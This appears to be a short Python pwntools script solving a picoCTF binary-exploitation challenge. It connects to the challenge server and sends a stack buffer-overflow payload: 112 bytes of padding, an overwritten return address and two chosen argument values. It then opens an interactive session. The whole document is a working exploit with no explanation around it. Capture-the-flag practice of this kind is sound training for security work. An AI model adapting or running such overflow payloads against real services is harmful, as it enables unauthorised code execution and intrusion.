from pwn import *

r = remote("saturn.picoctf.net",56741)
payload = b"A"*112 + p32(0x08049296) + b"A"*4+ p32(0xCAFEF00D) + p32(0xF00DF00D)
r.sendline(payload)
r.interactive()